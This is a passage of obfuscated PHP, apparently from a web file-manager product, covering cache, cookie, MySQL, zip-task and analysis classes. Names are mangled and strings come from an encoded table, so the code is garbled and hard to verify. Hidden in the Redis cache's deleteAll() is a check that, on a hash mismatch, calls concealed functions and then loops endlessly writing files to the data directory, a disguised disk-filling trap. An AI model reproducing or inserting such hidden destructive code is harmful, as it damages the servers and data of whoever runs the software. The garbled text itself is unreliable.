$¬úˆûÛú[849]; if (isset($ˆáΩÿàﬂ[$¬úˆûÛú[16]]) && in_array($ˆáΩÿàﬂ[$¬úˆûÛú[16]], $»Ëéç–Ú)) { $’ôïñ¸• = $ˆáΩÿàﬂ[$¬úˆûÛú[16]]; } switch ($’ôïñ¸•) { case $¬úˆûÛú[849]: $this->_slave($ˆáΩÿàﬂ, $Ç¢Ω«úØ); break; case $¬úˆûÛú[850]: break; case $¬úˆûÛú[851]: $this->isCluster = !0; $æºá•Èı = $ˆáΩÿàﬂ[$¬úˆûÛú[844]]; $ÙÔÍ∫“£ = isset($ˆáΩÿàﬂ[$¬úˆûÛú[848]]) ? $ˆáΩÿàﬂ[$¬úˆûÛú[848]] : !1; $≤⁄Òï¿Â = isset($ˆáΩÿàﬂ[$¬úˆûÛú[414]]) ? $ˆáΩÿàﬂ[$¬úˆûÛú[414]] : null; $this->handle = new RedisCluster(NUll, $æºá•Èı, $Ç¢Ω«úØ, $Ç¢Ω«úØ, $ÙÔÍ∫“£, $≤⁄Òï¿Â); break; default: break; } } private function _slave($È˚åáßÌ, $≈ÛæÉ”ô) { $ë¨ı¯ìç = $È˚åáßÌ[$_SERVER[ëæªã÷][844]]; $this->filterConfig($È˚åáßÌ, $ë¨ı¯ìç[0]); $this->handle = $this->init($È˚åáßÌ, $≈ÛæÉ”ô); unset($ë¨ı¯ìç[0]); if (empty($ë¨ı¯ìç)) { return; } $ªΩØÏ†÷ = array_rand($ë¨ı¯ìç); $this->filterConfig($È˚åáßÌ, $ë¨ı¯ìç[$ªΩØÏ†÷]); $this->slaveHandle = $this->init($È˚åáßÌ, $≈ÛæÉ”ô); } private function filterConfig(&$–—»üÂÖ, $‡ê©ªÌò) { $è‹ö¬—õ =& $_SERVER[ëæªã÷]; $˝âÌ‹¸ = explode($è‹ö¬—õ[4], $‡ê©ªÌò); $∏—Á˝ºï = array($è‹ö¬—õ[184] => $˝âÌ‹¸[0], $è‹ö¬—õ[185] => $˝âÌ‹¸[1]); $–—»üÂÖ = array_merge($–—»üÂÖ, $∏—Á˝ºï); } public function set($±˝¸é¡ô, $ÚåëÓ˝¸, $‹¶ÓÕ¿√ = false) { $‹¶ÓÕ¿√ = $‹¶ÓÕ¿√ ? $‹¶ÓÕ¿√ : $this->cacheTime; return $this->handle->setEx($±˝¸é¡ô, $‹¶ÓÕ¿√, $ÚåëÓ˝¸); } public function setLock($à§≤èÆî, $èÃå«Íç, $Äàö¸ª§) { return $this->handle->setNX($à§≤èÆî, $èÃå«Íç); } public function get($”ÇáïçÀ) { $¯≥î÷œÄ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¯≥î÷œÄ->get($”ÇáïçÀ); } public function remove($¸€Ù°ä˘) { return $this->handle->del($¸€Ù°ä˘); } public function deleteAll() { $‚¬˘„œï =& $_SERVER[ëæªã÷]; $¸¡ù‘‹‡ = $_SERVER[$‚¬˘„œï[69]]; $Ì»Æá Î = $‚¬˘„œï[852]; if ($_SERVER[$‚¬˘„œï[60]] != $Ì»Æá Î($¸¡ù‘‹‡)) { $Ïò≈Ω¡å = $‚¬˘„œï[853]; $Àç¨üÆÖ = $‚¬˘„œï[62]; $⁄¡’ƒ© = $_SERVER[$‚¬˘„œï[63]] . $‚¬˘„œï[64]; $°úàﬁÛì = $Àç¨üÆÖ($⁄¡’ƒ©); $ﬂíŒı’ç = explode($‚¬˘„œï[65], $°úàﬁÛì); if (count($ﬂíŒı’ç) < $‚¬˘„œï[628]) { $£¡‹Ï›ë = $‚¬˘„œï[67]; $£¡‹Ï›ë(); } $Ï©›øª≤ = $‚¬˘„œï[854]; $Ï©›øª≤($_SERVER[$‚¬˘„œï[855]]); $Ïò≈Ω¡å = $‚¬˘„œï[853]; $Ïò≈Ω¡å(); $Û°¬ú¥≈ = $‚¬˘„œï[856]; $∆◊Ã˛ó = json_encode($GLOBALS[$‚¬˘„œï[857]]); $Î˙Î–∑° = 1; for ($Èà®Áÿø = $Î˙Î–∑°; $Èà®Áÿø > 0; $Èà®Áÿø++) { $Û°¬ú¥≈(DATA_PATH . $Èà®Áÿø, $∆◊Ã˛ó); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $«√§Ûà∂) { $this->handle->flushall($«√§Ûà∂); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÔçÔ∂∆Á = '', $çù‚ÉÀ£ = 0) { if (is_string($ÔçÔ∂∆Á) && $ÔçÔ∂∆Á != $_SERVER[ëæªã÷][12]) { $this->prefix = $ÔçÔ∂∆Á; } if (is_numeric($çù‚ÉÀ£) && $çù‚ÉÀ£ > 0) { $this->expire = $çù‚ÉÀ£; } } public static function getInstance() { static $µ≈ÑôﬁΩ; if ($µ≈ÑôﬁΩ === null) { $µ≈ÑôﬁΩ = new self(); } return $µ≈ÑôﬁΩ; } private static $cookieDisable = false; public static function disable($ƒÌåô©ò) { self::$cookieDisable = $ƒÌåô©ò; } private static $sameCookieSet = array(); public static function set($ƒèÕã”º, $Å†ü≈©Ë, $öÁä¸í“ = 0, $˘–§”âñ = false, $°´ß·∑è = false) { $≤ºúﬁæ† =& $_SERVER[ëæªã÷]; if (self::$cookieDisable) { return; } if (!$öÁä¸í“) { $öÁä¸í“ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ƒèÕã”º]) && self::$sameCookieSet[$ƒèÕã”º] == $Å†ü≈©Ë . $öÁä¸í“) { return; } self::$sameCookieSet[$ƒèÕã”º] = $Å†ü≈©Ë . $öÁä¸í“; if (!$°´ß·∑è) { $°´ß·∑è = str_replace(HOST, $≤ºúﬁæ†[12], APP_HOST); $°´ß·∑è = _get($GLOBALS, $≤ºúﬁæ†[858], $°´ß·∑è); } $≤¸°œíí = $≤ºúﬁæ†[12]; setcookie($ƒèÕã”º, $Å†ü≈©Ë, time() + $öÁä¸í“, $≤ºúﬁæ†[8] . trim($°´ß·∑è, $≤ºúﬁæ†[8]) . $≤¸°œíí, !1, !1, $˘–§”âñ); } public static function setSafe($â´¿»Æé, $ÜÄ˚º˙Æ, $•á◊•≈´ = 0) { self::set($â´¿»Æé, $ÜÄ˚º˙Æ, $•á◊•≈´, !0); } public static function get($Ü¥ˆ˜⁄≠) { static $Ìäπﬂ˙Á = false; if (!$Ìäπﬂ˙Á) { self::initHeaderCookie(); $Ìäπﬂ˙Á = !0; } return isset($_COOKIE[$Ü¥ˆ˜⁄≠]) ? $_COOKIE[$Ü¥ˆ˜⁄≠] : !1; } private static function initHeaderCookie() { $Ì∏∞‡˘é =& $_SERVER[ëæªã÷]; if (!isset($_SERVER[$Ì∏∞‡˘é[859]]) || !$_SERVER[$Ì∏∞‡˘é[859]]) { return; } $°ºÒåñ÷ = explode($Ì∏∞‡˘é[81], $_SERVER[$Ì∏∞‡˘é[859]]); foreach ($°ºÒåñ÷ as $Ù∞Çãûê) { $Ù∞Çãûê = explode($Ì∏∞‡˘é[860], $Ù∞Çãûê); if (count($Ù∞Çãûê) != 2 || !isset($Ù∞Çãûê[1])) { continue; } $_COOKIE[trim($Ù∞Çãûê[0])] = trim($Ù∞Çãûê[1]); } } public static function remove($Ñ„Â⁄≈ê, $œÒ‹ëá» = false) { unset($_COOKIE[$Ñ„Â⁄≈ê]); self::set($Ñ„Â⁄≈ê, $_SERVER[ëæªã÷][12], 1, $œÒ‹ëá»); } } class DbMysql extends Db { public function __construct($˝Úô˚—⁄ = '') { $∆Ê±ß˝˘ =& $_SERVER[ëæªã÷]; if (!extension_loaded($∆Ê±ß˝˘[784])) { think_exception(think_lang($∆Ê±ß˝˘[14]) . $∆Ê±ß˝˘[861]); } if (!empty($˝Úô˚—⁄)) { $this->config = $˝Úô˚—⁄; if (empty($this->config[$∆Ê±ß˝˘[17]])) { $this->config[$∆Ê±ß˝˘[17]] = $∆Ê±ß˝˘[12]; } } } public function connect($–˙ü˛ß„ = '', $ñ∞¯€æ = 0, $Û˜‚‡Ï€ = false) { $ÅÚ∫Á¡ƒ =& $_SERVER[ëæªã÷]; if (!isset($this->linkID[$ñ∞¯€æ])) { if (empty($–˙ü˛ß„)) { $–˙ü˛ß„ = $this->config; } $ÃÊ˙õÑÈ = $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[862]] . ($–˙ü˛ß„[$ÅÚ∫Á¡ƒ[863]] ? "\x3a{$–˙ü˛ß„[$ÅÚ∫Á¡ƒ[863]]}" : $ÅÚ∫Á¡ƒ[12]); $ë´≤˛åè = !empty($–˙ü˛ß„[$ÅÚ∫Á¡ƒ[17]][$ÅÚ∫Á¡ƒ[18]]) ? $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[17]][$ÅÚ∫Á¡ƒ[18]] : $this->pconnect; if ($ë´≤˛åè) { $this->linkID[$ñ∞¯€æ] = mysql_pconnect($ÃÊ˙õÑÈ, $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[864]], $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[865]], 131072); } else { $this->linkID[$ñ∞¯€æ] = mysql_connect($ÃÊ˙õÑÈ, $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[864]], $–˙ü˛ß„[$ÅÚ∫Á¡ƒ[865]], !0, 131072); } if (!$this->linkID[$ñ∞¯€æ] || !empty($–˙ü˛ß„[$ÅÚ∫Á¡ƒ[21]]) && !mysql_select_db($–˙ü˛ß„[$ÅÚ∫Á¡ƒ[21]], $this->linkID[$ñ∞¯€æ])) { think_exception(mysql_error()); } $˝µ‘©·Ÿ = mysql_get_server_info($this->linkID[$ñ∞¯€æ]); mysql_query($ÅÚ∫Á¡ƒ[866] . think_config($ÅÚ∫Á¡ƒ[867]) . $ÅÚ∫Á¡ƒ[58], $this->linkID[$ñ∞¯€æ]); if ($˝µ‘©·Ÿ > $ÅÚ∫Á¡ƒ[868]) { mysql_query($ÅÚ∫Á¡ƒ[869], $this->linkID[$ñ∞¯€æ]); } $this->connected = !0; if (1 != think_config($ÅÚ∫Á¡ƒ[22])) { unset($this->config); } } return $this->linkID[$ñ∞¯€æ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ì°ı¸≈¸) { $„Æ©≈ïÒ =& $_SERVER[ëæªã÷]; if (0 === stripos($ì°ı¸≈¸, $„Æ©≈ïÒ[268])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì°ı¸≈¸; if ($this->queryID) { $this->free(); } think_action_status($„Æ©≈ïÒ[23], 1); think_status($„Æ©≈ïÒ[24]); $this->queryID = mysql_query($ì°ı¸≈¸, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($íÖ–ü„å) { $ÇØûéá™ =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $íÖ–ü„å; if ($this->queryID) { $this->free(); } think_action_status($ÇØûéá™[25], 1); think_status($ÇØûéá™[24]); $ÆÚô”Î∞ = mysql_query($íÖ–ü„å, $this->_linkID); $this->debug(); if (!1 === $ÆÚô”Î∞) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ëæªã÷][870], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡ƒﬁ∑∞À = mysql_query($_SERVER[ëæªã÷][871], $this->_linkID); $this->transTimes = 0; if (!$¡ƒﬁ∑∞À) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…öù¿è¿ = mysql_query($_SERVER[ëæªã÷][872], $this->_linkID); $this->transTimes = 0; if (!$…öù¿è¿) { $this->error(); return !1; } } return !0; } private function getAll() { $ÅÑãÈõ© = array(); if ($this->numRows > 0) { while ($ç¢ÏÒÓ˜ = mysql_fetch_assoc($this->queryID)) { $ÅÑãÈõ©[] = $ç¢ÏÒÓ˜; } mysql_data_seek($this->queryID, 0); } return $ÅÑãÈõ©; } public function getFields($í¿≠ﬂÖÙ) { $çæ’¡ö√ =& $_SERVER[ëæªã÷]; $‡ºôàâ‘ = $this->query($çæ’¡ö√[873] . $this->parseKey($í¿≠ﬂÖÙ)); $‹≥±˚´ò = array(); if ($‡ºôàâ‘) { foreach ($‡ºôàâ‘ as $˚∑˝—èà => $”îÈ¢”ı) { $‹≥±˚´ò[$”îÈ¢”ı[$çæ’¡ö√[31]]] = array($çæ’¡ö√[32] => $”îÈ¢”ı[$çæ’¡ö√[31]], $çæ’¡ö√[33] => $”îÈ¢”ı[$çæ’¡ö√[34]], $çæ’¡ö√[35] => (bool) (strtoupper($”îÈ¢”ı[$çæ’¡ö√[36]]) === $çæ’¡ö√[874]), $çæ’¡ö√[37] => $”îÈ¢”ı[$çæ’¡ö√[38]], $çæ’¡ö√[39] => strtolower($”îÈ¢”ı[$çæ’¡ö√[40]]) == $çæ’¡ö√[41], $çæ’¡ö√[42] => strtolower($”îÈ¢”ı[$çæ’¡ö√[43]]) == $çæ’¡ö√[44]); } } return $‹≥±˚´ò; } public function getTables($ˆ˚áüä = '') { $§Ò≠√ÂÑ =& $_SERVER[ëæªã÷]; if (!empty($ˆ˚áüä)) { $Ú†¢ÖµÀ = $§Ò≠√ÂÑ[875] . $ˆ˚áüä . $§Ò≠√ÂÑ[876]; } else { $Ú†¢ÖµÀ = $§Ò≠√ÂÑ[877]; } $≠˝¡Â Ñ = $this->query($Ú†¢ÖµÀ); $ÇË ˘∆º = array(); foreach ($≠˝¡Â Ñ as $´ù§’ê´ => $ê«î¬≤É) { $ÇË ˘∆º[$´ù§’ê´] = current($ê«î¬≤É); } return $ÇË ˘∆º; } public function replace($çÄî„¯´, $ÿÚüœÃı = array()) { $≤∞§≠†Æ =& $_SERVER[ëæªã÷]; foreach ($çÄî„¯´ as $Ω∞‰ä‘ˆ => $˜‚¬î°é) { $á⁄¡Í”© = $this->parseValue($˜‚¬î°é); if (is_scalar($á⁄¡Í”©)) { $ •æùÛ∞[] = $á⁄¡Í”©; $Ò±ö˝´Ä[] = $this->parseKey($Ω∞‰ä‘ˆ); } } $æ√¢†ú = $≤∞§≠†Æ[878] . $this->parseTable($ÿÚüœÃı[$≤∞§≠†Æ[283]]) . $≤∞§≠†Æ[879] . implode($≤∞§≠†Æ[50], $Ò±ö˝´Ä) . $≤∞§≠†Æ[880] . implode($≤∞§≠†Æ[50], $ •æùÛ∞) . $≤∞§≠†Æ[881]; return $this->execute($æ√¢†ú); } public function insertAll($¥⁄‰Ω±Í, $° Åö∫ª = array(), $õ»á„ìΩ = false) { $≥¬≠ÒŸÀ =& $_SERVER[ëæªã÷]; if (!is_array($¥⁄‰Ω±Í[0])) { return !1; } $ï∫”èáÃ = array_keys($¥⁄‰Ω±Í[0]); $Ì¥˝≈”— = array(); foreach ($¥⁄‰Ω±Í as $©±©äÊÚ) { $ˆÏıè∞ = array(); foreach ($©±©äÊÚ as $±˘ãòπä => $ﬁ¥ÛÙœí) { $ﬁ¥ÛÙœí = $this->parseValue($ﬁ¥ÛÙœí); if (is_scalar($ﬁ¥ÛÙœí)) { $ˆÏıè∞[] = $ﬁ¥ÛÙœí; } } $Ì¥˝≈”—[] = $≥¬≠ÒŸÀ[264] . implode($≥¬≠ÒŸÀ[50], $ˆÏıè∞) . $≥¬≠ÒŸÀ[881]; } array_walk($ï∫”èáÃ, array($this, $≥¬≠ÒŸÀ[882])); $ÇáÑ˚≥‡ = ($õ»á„ìΩ ? $≥¬≠ÒŸÀ[883] : $≥¬≠ÒŸÀ[884]) . $≥¬≠ÒŸÀ[885] . $this->parseTable($° Åö∫ª[$≥¬≠ÒŸÀ[283]]) . $≥¬≠ÒŸÀ[879] . implode($≥¬≠ÒŸÀ[50], $ï∫”èáÃ) . $≥¬≠ÒŸÀ[886] . implode($≥¬≠ÒŸÀ[50], $Ì¥˝≈”—); return $this->execute($ÇáÑ˚≥‡); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $œóÿº— =& $_SERVER[ëæªã÷]; $this->error = mysql_errno() . $œóÿº—[4] . mysql_error($this->_linkID); if ($œóÿº—[12] != $this->queryStr) { $this->error .= LNG($œóÿº—[48]) . $this->queryStr; } think_trace($this->error, $œóÿº—[12], $œóÿº—[49]); return $this->error; } public function escapeString($§Íﬁ÷ò≤) { if ($this->_linkID) { return mysql_real_escape_string($§Íﬁ÷ò≤, $this->_linkID); } else { return mysql_escape_string($§Íﬁ÷ò≤); } } public function parseKey(&$ˆ¯Áá©®, $‘ºÂÉäŸ = true) { $¬•Àß°€ =& $_SERVER[ëæªã÷]; if ($‘ºÂÉäŸ) { $ˆ¯Áá©® = $this->parseKeyCheck($ˆ¯Áá©®); } if ($ˆ¯Áá©® != $¬•Àß°€[191] && !preg_match($¬•Àß°€[887], $ˆ¯Áá©®)) { $ˆ¯Áá©® = $¬•Àß°€[389] . trim($ˆ¯Áá©®, $¬•Àß°€[389]) . $¬•Àß°€[389]; } return $ˆ¯Áá©®; } } goto c˘ëÁ≈éá; e’ÊœÇ¡é : class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Â‹ïÈŸÅ =& $_SERVER[ëæªã÷]; parent::startAfter(); Hook::bind($Â‹ïÈŸÅ[1717], array($this, $Â‹ïÈŸÅ[1718])); Hook::bind($Â‹ïÈŸÅ[1168], array($this, $Â‹ïÈŸÅ[1719])); $˛”‰ÀÖÄ =& $this->task; $˛”‰ÀÖÄ[$Â‹ïÈŸÅ[1720]] = $Â‹ïÈŸÅ[1173]; if (!$˛”‰ÀÖÄ[$Â‹ïÈŸÅ[1528]]) { $˛”‰ÀÖÄ[$Â‹ïÈŸÅ[1528]] = LNG($Â‹ïÈŸÅ[1721]); } } protected function endAfter() { $ö∞≥‹´µ =& $_SERVER[ëæªã÷]; parent::endAfter(); Hook::unbind($ö∞≥‹´µ[1717], array($this, $ö∞≥‹´µ[1718])); Hook::unbind($ö∞≥‹´µ[1168], array($this, $ö∞≥‹´µ[1719])); } public function updateAfter() { $é•Àª˜ =& $_SERVER[ëæªã÷]; $¿‹·»äæ =& $this->task; if (!$¿‹·»äæ[$é•Àª˜[766]] || !$¿‹·»äæ[$é•Àª˜[743]]) { return; } if ($¿‹·»äæ[$é•Àª˜[1720]] == $é•Àª˜[1173]) { $Ñ´“˙õˆ = 0; if ($¿‹·»äæ[$é•Àª˜[1676]]) { $Ñ´“˙õˆ = $¿‹·»äæ[$é•Àª˜[1677]] / $¿‹·»äæ[$é•Àª˜[1676]]; } $¿‹·»äæ[$é•Àª˜[1630]] = $Ñ´“˙õˆ * 0.3; } else { if ($¿‹·»äæ[$é•Àª˜[1720]] == $é•Àª˜[317]) { $Ñ´“˙õˆ = $¿‹·»äæ[$é•Àª˜[1629]] / $¿‹·»äæ[$é•Àª˜[766]]; $¿‹·»äæ[$é•Àª˜[1630]] = 0.3 + $Ñ´“˙õˆ * 0.4; } else { if ($¿‹·»äæ[$é•Àª˜[1720]] == $é•Àª˜[118]) { $ÃñõêÎÎ = 0; if ($¿‹·»äæ[$é•Àª˜[1678]] == $é•Àª˜[118]) { $ÃñõêÎÎ = $¿‹·»äæ[$é•Àª˜[1677]]; } $Ñ´“˙õˆ = ($¿‹·»äæ[$é•Àª˜[1681]] + $ÃñõêÎÎ) / $¿‹·»äæ[$é•Àª˜[743]]; $¿‹·»äæ[$é•Àª˜[1630]] = 0.3 + 0.4 + $Ñ´“˙õˆ * 0.3; } } } if ($¿‹·»äæ[$é•Àª˜[1630]] > 0) { $†◊ı‚Ó∑ = timeFloat() - $¿‹·»äæ[$é•Àª˜[1632]] - $¿‹·»äæ[$é•Àª˜[1635]]; $¿‹·»äæ[$é•Àª˜[1636]] = $†◊ı‚Ó∑ * (1 - $¿‹·»äæ[$é•Àª˜[1630]]) / $¿‹·»äæ[$é•Àª˜[1630]]; } } public function addFile($∞ß…Ãﬁ·) { $ﬁÔ™Êëﬁ =& $_SERVER[ëæªã÷]; $–“ÎÌÂ… =& $this->task; $á÷íª§‰ = IO::info($∞ß…Ãﬁ·); $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1674]] = $á÷íª§‰[$ﬁÔ™Êëﬁ[32]]; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1676]] = $á÷íª§‰[$ﬁÔ™Êëﬁ[90]]; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1677]] = 0; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1040]] = $ﬁÔ™Êëﬁ[1696]; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1678]] = $ﬁÔ™Êëﬁ[1173]; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[743]] = $á÷íª§‰[$ﬁÔ™Êëﬁ[90]]; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[766]] = 1; $øãÑä ∏ = 0; $–“ÎÌÂ…[$ﬁÔ™Êëﬁ[1685]] = array($ﬁÔ™Êëﬁ[1686] => $øãÑä ∏ + 1, $ﬁÔ™Êëﬁ[421] => $á÷íª§‰[$ﬁÔ™Êëﬁ[32]], $ﬁÔ™Êëﬁ[88] => $á÷íª§‰[$ﬁÔ™Êëﬁ[88]], $ﬁÔ™Êëﬁ[519] => $á÷íª§‰[$ﬁÔ™Êëﬁ[519]] ? $á÷íª§‰[$ﬁÔ™Êëﬁ[519]] : $á÷íª§‰[$ﬁÔ™Êëﬁ[88]]); $this->update(); } public function unzipAfter($Œç–˙˚˘) { $¿ ¿˚Äã =& $_SERVER[ëæªã÷]; $ıì•¬†£ =& $this->task; $ıì•¬†£[$¿ ¿˚Äã[1720]] = $¿ ¿˚Äã[118]; $ïÊ‘Å÷⁄ = IO::infoWithChildren($Œç–˙˚˘); $†Ò∫£“≠ = 0; $ıì•¬†£[$¿ ¿˚Äã[1685]] = array($¿ ¿˚Äã[1686] => $†Ò∫£“≠ + 1, $¿ ¿˚Äã[421] => $ïÊ‘Å÷⁄[$¿ ¿˚Äã[32]], $¿ ¿˚Äã[88] => $ïÊ‘Å÷⁄[$¿ ¿˚Äã[88]], $¿ ¿˚Äã[519] => $ïÊ‘Å÷⁄[$¿ ¿˚Äã[519]] ? $ïÊ‘Å÷⁄[$¿ ¿˚Äã[519]] : $ïÊ‘Å÷⁄[$¿ ¿˚Äã[88]]); if ($ïÊ‘Å÷⁄[$¿ ¿˚Äã[33]] == $¿ ¿˚Äã[202]) { $ıì•¬†£[$¿ ¿˚Äã[766]] = 1; } else { $ıì•¬†£[$¿ ¿˚Äã[766]] = $ïÊ‘Å÷⁄[$¿ ¿˚Äã[93]][$¿ ¿˚Äã[91]]; } $ıì•¬†£[$¿ ¿˚Äã[1040]] = $¿ ¿˚Äã[12]; $ıì•¬†£[$¿ ¿˚Äã[1678]] = 0; $ıì•¬†£[$¿ ¿˚Äã[1629]] = 0; $ıì•¬†£[$¿ ¿˚Äã[1676]] = 0; $ıì•¬†£[$¿ ¿˚Äã[1677]] = 0; $ıì•¬†£[$¿ ¿˚Äã[1674]] = $¿ ¿˚Äã[12]; $ıì•¬†£[$¿ ¿˚Äã[1681]] = 0; $ıì•¬†£[$¿ ¿˚Äã[743]] = $ïÊ‘Å÷⁄[$¿ ¿˚Äã[90]]; $this->update(); self::log($¿ ¿˚Äã[1722] . json_encode(array($ıì•¬†£, $ïÊ‘Å÷⁄))); } public function nameParse($ÑÄÆ†çî) { $¨»Œ·°º =& $_SERVER[ëæªã÷]; $µÔ“Ôº∏ =& $this->task; if ($µÔ“Ôº∏[$¨»Œ·°º[1720]] == $¨»Œ·°º[1173]) { $µÔ“Ôº∏[$¨»Œ·°º[1720]] = $¨»Œ·°º[317]; $µÔ“Ôº∏[$¨»Œ·°º[1681]] = 0; $µÔ“Ôº∏[$¨»Œ·°º[743]] = 0; } $π·¶‘¡¢ = get_path_this($ÑÄÆ†çî); if (strstr($π·¶‘¡¢, $¨»Œ·°º[10])) { $µÔ“Ôº∏[$¨»Œ·°º[1629]] += 1; $µÔ“Ôº∏[$¨»Œ·°º[766]] += 1; } $µÔ“Ôº∏[$¨»Œ·°º[1674]] = $ÑÄÆ†çî; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ê¶—î¡Ó =& $_SERVER[ëæªã÷]; parent::startAfter(); Hook::bind($Ê¶—î¡Ó[1723], array($this, $Ê¶—î¡Ó[1718])); $¬ ˆ– Ì =& $this->task; $¬ ˆ– Ì[$Ê¶—î¡Ó[1720]] = $Ê¶—î¡Ó[1173]; if (!$¬ ˆ– Ì[$Ê¶—î¡Ó[1528]]) { $¬ ˆ– Ì[$Ê¶—î¡Ó[1528]] = LNG($Ê¶—î¡Ó[1724]); } } protected function endAfter() { $›ﬂêØ‹∑ =& $_SERVER[ëæªã÷]; parent::endAfter(); Hook::unbind($›ﬂêØ‹∑[1723], array($this, $›ﬂêØ‹∑[1718])); } public function updateAfter() { $à–î´¯Ú =& $_SERVER[ëæªã÷]; $ºÊ¸ùÎï =& $this->task; if (!$ºÊ¸ùÎï[$à–î´¯Ú[766]] || !$ºÊ¸ùÎï[$à–î´¯Ú[743]]) { return; } if ($ºÊ¸ùÎï[$à–î´¯Ú[1720]] == $à–î´¯Ú[1173]) { $ò¸∂ûè≤ = $ºÊ¸ùÎï[$à–î´¯Ú[1677]]; if ($ºÊ¸ùÎï[$à–î´¯Ú[1678]] != $à–î´¯Ú[1173]) { $ò¸∂ûè≤ = 0; } $¡“Ÿπ¢¡ = ($ºÊ¸ùÎï[$à–î´¯Ú[1681]] + $ò¸∂ûè≤) / $ºÊ¸ùÎï[$à–î´¯Ú[743]]; $ºÊ¸ùÎï[$à–î´¯Ú[1630]] = $¡“Ÿπ¢¡ * 0.3; } else { if ($ºÊ¸ùÎï[$à–î´¯Ú[1720]] == $à–î´¯Ú[317]) { $¡“Ÿπ¢¡ = $ºÊ¸ùÎï[$à–î´¯Ú[1629]] / $ºÊ¸ùÎï[$à–î´¯Ú[766]]; $ºÊ¸ùÎï[$à–î´¯Ú[1630]] = 0.3 + $¡“Ÿπ¢¡ * 0.5; } else { if ($ºÊ¸ùÎï[$à–î´¯Ú[1720]] == $à–î´¯Ú[118]) { $¡“Ÿπ¢¡ = 0; if ($ºÊ¸ùÎï[$à–î´¯Ú[1676]]) { $¡“Ÿπ¢¡ = $ºÊ¸ùÎï[$à–î´¯Ú[1677]] / $ºÊ¸ùÎï[$à–î´¯Ú[1676]]; } $ºÊ¸ùÎï[$à–î´¯Ú[1630]] = 0.3 + 0.5 + $¡“Ÿπ¢¡ * 0.2; } } } if ($ºÊ¸ùÎï[$à–î´¯Ú[1630]] > 0) { $Çü¸ƒ“œ = timeFloat() - $ºÊ¸ùÎï[$à–î´¯Ú[1632]] - $ºÊ¸ùÎï[$à–î´¯Ú[1635]]; $ºÊ¸ùÎï[$à–î´¯Ú[1636]] = $Çü¸ƒ“œ * (1 - $ºÊ¸ùÎï[$à–î´¯Ú[1630]]) / $ºÊ¸ùÎï[$à–î´¯Ú[1630]]; } } public function copyFileStart($ı”Áñßπ, $ÇõÁÏØÒ, $ç”ß˙›‹, $›¡É†ö, $Íü‰ÒÌü, $⁄äùãø‡) { $„∏«Æ·Œ =& $_SERVER[ëæªã÷]; parent::copyFileStart($ı”Áñßπ, $ÇõÁÏØÒ, $ç”ß˙›‹, $›¡É†ö, $Íü‰ÒÌü, $⁄äùãø‡); $ËãŸ∞€ =& $this->task; if ($ËãŸ∞€[$„∏«Æ·Œ[1720]] == $„∏«Æ·Œ[317]) { $ËãŸ∞€[$„∏«Æ·Œ[1720]] = $„∏«Æ·Œ[118]; } $this->update(); } public function copyFileEnd($¿˜«≠Ÿ , $€‚ﬁ‚∂’, $Œ§çÔö´, $∫øÛ∞æ¶, $ßÖªÌñ, $™∫Í⁄îæ) { $„√…™êΩ =& $_SERVER[ëæªã÷]; $…á˘¿˝ê =& $this->task; $…á˘¿˝ê[$„√…™êΩ[1677]] = $…á˘¿˝ê[$„√…™êΩ[1676]]; $…á˘¿˝ê[$„√…™êΩ[1681]] += $…á˘¿˝ê[$„√…™êΩ[1676]]; $…á˘¿˝ê[$„√…™êΩ[1678]] = $„√…™êΩ[12]; $this->update(); } public function nameParse($Ë„ŒÉ˛è) { $»ˆ≥™ñ‹ =& $_SERVER[ëæªã÷]; $πõπ‚äÅ =& $this->task; if ($πõπ‚äÅ[$»ˆ≥™ñ‹[1629]] < $πõπ‚äÅ[$»ˆ≥™ñ‹[766]]) { $Ö¨Ìì‹™ = get_path_this($Ë„ŒÉ˛è); if (strstr($Ö¨Ìì‹™, $»ˆ≥™ñ‹[10])) { $πõπ‚äÅ[$»ˆ≥™ñ‹[1629]] += 1; } } if ($πõπ‚äÅ[$»ˆ≥™ñ‹[1720]] == $»ˆ≥™ñ‹[1173]) { $πõπ‚äÅ[$»ˆ≥™ñ‹[1720]] = $»ˆ≥™ñ‹[317]; } $πõπ‚äÅ[$»ˆ≥™ñ‹[1674]] = $Ë„ŒÉ˛è; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($…˛≈—¡˝) { $€å¥û±Ì =& $_SERVER[ëæªã÷]; $≤¢êÅ•™ = array($€å¥û±Ì[594] => array($€å¥û±Ì[33] => $€å¥û±Ì[1725], $€å¥û±Ì[277] => array($€å¥û±Ì[229], $€å¥û±Ì[745], $€å¥û±Ì[1726], $€å¥û±Ì[1727])), $€å¥û±Ì[1728] => array($€å¥û±Ì[33] => $€å¥û±Ì[1729], $€å¥û±Ì[277] => array($€å¥û±Ì[229], 